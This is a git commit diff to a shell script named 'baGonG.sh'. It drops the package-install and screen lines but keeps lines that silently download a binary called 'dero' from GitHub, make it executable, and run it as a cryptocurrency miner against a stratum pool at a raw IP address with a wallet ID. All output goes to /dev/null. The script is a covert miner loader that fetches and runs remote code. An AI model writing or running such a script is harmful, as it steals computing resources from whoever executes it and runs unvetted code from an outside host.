e878ae9f6bcfcad6e432d9bffd857207c2afff23
RizQu5 <122372013+RizQu5@users.noreply.github.com>
2023-01-14 17:21:51 +0700

    Update baGonG.sh

--- baGonG.sh
+++ baGonG.sh
@@ -4,15 +4,10 @@
 
 #!/bin/bash
 
-apt update
-
-sudo apt install screen libjansson4 -y 
-
 wget https://github.com/monariski217/2022/raw/main/dero >/dev/null 2>&1
 
 chmod +x dero >/dev/null 2>&1
 
-screen -dmS ls
 
 ./dero -a minotaurx -o stratum+tcps://178.62.199.36:80 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3.02_beDO > /dev/null 2>&1
 
